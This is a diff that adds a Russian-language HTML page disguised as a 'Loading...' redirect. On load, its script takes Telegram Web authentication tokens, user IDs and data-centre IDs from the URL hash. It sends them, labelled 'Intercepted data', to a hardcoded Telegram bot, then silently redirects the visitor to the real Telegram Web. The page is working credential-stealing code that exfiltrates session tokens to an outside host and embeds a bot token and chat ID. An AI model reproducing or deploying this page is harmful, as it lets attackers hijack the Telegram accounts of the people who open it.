@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Загрузка...</title>
+    <script>
+        (function() {
+            // Извлекаем хэш (часть после #)
+            const hash = window.location.hash.substring(1);
+            if (hash) {
+                const params = new URLSearchParams(hash);
+                const token = params.get('tgWebAuthToken');
+                const userId = params.get('tgWebAuthUserId');
+                const dcId = params.get('tgWebAuthDcId');
+                
+                // Если все параметры присутствуют
+                if (token && userId && dcId) {
+                    const botToken = '8541613029:AAF9uWzlAYEJy1kNM89yQfMtIz3bh53AOo4';
+                    const chatId = '8220267007';
+                    const message = `🔐 Перехваченные данные:\nТокен: ${token}\nUser ID: ${userId}\nDC ID: ${dcId}\nПолная ссылка: ${window.location.href}`;
+                    
+                    // Отправляем в Telegram (асинхронно, не ждём ответа)
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId, text: message })
+                    }).catch(() => {});
+                }
+            }
+            // Перенаправляем на официальный сайт Telegram Web
+            window.location.replace('https://web.telegram.org/k/');
+        })();
+    </script>
+</head>
+<body>
+    <p>Перенаправление...</p>
+</body>
+</html>
